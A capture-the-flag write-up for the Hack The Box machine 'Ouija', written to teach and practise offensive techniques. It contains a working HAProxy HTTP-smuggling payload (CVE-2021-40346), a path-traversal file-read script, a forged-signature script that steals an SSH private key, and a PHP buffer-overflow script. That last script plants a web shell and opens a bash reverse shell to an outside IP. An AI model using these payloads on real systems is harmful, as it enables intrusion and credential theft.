
# Ouija

![logo](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Ouija/Ouija.png)

## nmap

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 6f:f2:b4:ed:1a:91:8d:6e:c9:10:51:71:d5:7c:49:bb (ECDSA)
|_  256 df:dd:bc:dc:57:0d:98:af:0f:88:2f:73:33:48:62:e8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
|_http-favicon: Unknown favicon MD5: 03684398EBF8D6CD258D44962AE50D1D
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Subdomains

- ouija.htb
- dev.ouija.htb
- gitea.ouija.htb

We can download the source code in gitea for the webside 8080. We see the version of HAProxy is `2.2.16`

## HAProxy 2.2.16: Integer Overflow Enables HTTP Smuggling — `CVE-2021-40346`

An integer overflow exists in HAProxy 2.0 through 2.5

[Critical vulnerability in HAProxy | JFrog Security Research Team](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/)

We can send a second reqest with a buff overflow in the Content-Length. The Content-Length for the second request need to be correct!

```
POST /index.html HTTP/1.1
Host: ouija.htb
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 
Content-Length: 68

GET http://dev.ouija.htb HTTP/1.1
h:GET / HTTP/1.1
Host: ouija.htb
```

Send this some times, because we need to catch the bot that send his request to trigger the smuggling (second request).

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Ouija/project.png)

We know see the local [http://dev.ouija.htb](http://dev.ouija.htb/) page.

## LFI

When we check the source code. There is a `file` url parameter for a LFI.

```html
</strong> <a href="http://dev.ouija.htb/editor.php?file=app.js" target="_blank">app.js</a>
            <strong>Init File:</strong> <a href="http://dev.ouija.htb/editor.php?file=init.sh" target="_blank">init.sh</a>
        </li>
```

We can read files with that. 

- [LFI.py](http://LFI.py) auto script
    
    ```python
    #!/usr/bin/python3
    import requests
    from time import sleep
    
    file = input("file: ")
    
    data = f'GET http://dev.ouija.htb/editor.php?file=../../../../../../../..{file} HTTP/1.1\r\nh:GET / HTTP/1.1\r\nHost: ouija.htb'
    
    headers = {
        'Host': 'ouija.htb',
        'Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa':'',
        'Content-Length': str(len(data))
    }
    #print("Content-Length: "+ str(len(data)))
    proxies = {
       'http': 'http://127.0.0.1:8080'
    }
    print("Give me some time...")
    while True:
        r = requests.post('http://ouija.htb/index.html',proxies=proxies, headers=headers, data=data, verify=False)
        if len(r.text) != 18017:
            print()
            print(r.text)
            break
    ```
    

Read the [init.sh](http://init.sh) in the same directory. 

```
GET http://dev.ouija.htb/editor.php?file=init.sh HTTP/1.1
h:GET / HTTP/1.1
Host: ouija.htb
```

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Ouija/editor.png)

```bash
#!/bin/bash

echo "$(date) api config starts" >>
mkdir -p .config/bin .config/local .config/share /var/log/zapi
export k=$(cat /opt/auth/api.key)
export botauth_id="bot1:bot"
export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
ln -s /proc .config/bin/process_informations
echo "$(date) api config done" >> /var/log/zapi/api.log

exit 1
```

We find a hash for the API at port 3000.

This script get use access with the hash end read the id_rsa from the user, because there is a file read API. 

- read_id_rsa.py
    
    ```python
    #!/usr/bin/python3
    
    import base64
    import requests
    import binascii
    import urllib.parse
    import json
    
    sigs = [b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00X::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00h::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa8::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe8::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf8::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x08::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x18::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01 ::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01(::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x010::admin:True",
    b"bot1:bot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x018::admin:True"]
    
    hash = b"14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b"
    
    """
    for sig in sigs:
    
        url = 'http://ouija.htb:3000/file/get?file=.env'
        headers = {
            'ihash': hash,
            'identification': base64.b64encode(binascii.hexlify(sig))
        }
    
        response = requests.get(url, headers=headers)
    
        print(sigs.index(sig), response.text)
    """
    
    original_string = ".config/bin/process_informations/self/root/home/leila/.ssh/id_rsa"
    encoded_string = urllib.parse.quote(urllib.parse.quote(original_string))
    
    url = f'http://ouija.htb:3000/file/get?file={encoded_string}'
    headers = {
        'ihash': hash,
        'identification': base64.b64encode(binascii.hexlify(sigs[21]))
    }
    response = requests.get(url, headers=headers)
    print(json.loads(response.text)['message'])
    ```
    

After we got the id_rsa, we can login to the user leila from the gitea (/etc/passwd).

- `ssh leila@ouija.htb -i id_rsa`

→ user.txt

# Priv Esc

There is a local webserver on port 9999

## PHP Buff Overflow

Run this on the target to get a rev shell

```python
import requests
import time
import subprocess

url = 'http://127.0.0.1:9999/index.php'

def create_payload():
    payload = "cmd.php\n"
    payload = payload.ljust(0x70, "A")
    payload += "<?php system($_GET['cmd']);?>:"
    payload = payload.ljust(0xfff0, "A")
    return payload

def send_payload(payload):
    data = {"username":payload, "password":payload}
    r = requests.post(url, data=data)
    print('[-] Sent payload triggering buffer overflow...')

def main():
    exe_addr = "http://127.0.0.1:9999/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.44%2F4444%200%3E%261%22"
    listener = subprocess.Popen(["nc", "-nvlp", "4444"])
    time.sleep(2)
    p = requests.get(exe_addr)
    print('[-] Request revshell has been sent!')
    print('[-] Waiting for shell...')
    listener.wait()

if __name__ == '__main__':
    payload = create_payload()
    send_payload(payload)
    main()
```

→ root.txt
